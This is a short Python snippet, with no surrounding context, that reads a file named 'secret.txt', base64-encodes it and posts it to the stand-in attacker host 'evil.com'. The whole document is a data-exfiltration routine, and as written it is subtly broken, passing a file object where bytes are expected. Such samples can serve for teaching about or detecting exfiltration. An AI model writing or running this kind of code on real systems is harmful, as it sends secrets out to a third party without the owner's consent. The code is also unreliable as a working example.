import base64
import requests

data = open("secret.txt")

encoded = base64.b64encode(data)

requests.post(
    "http://evil.com",
    data=encoded
)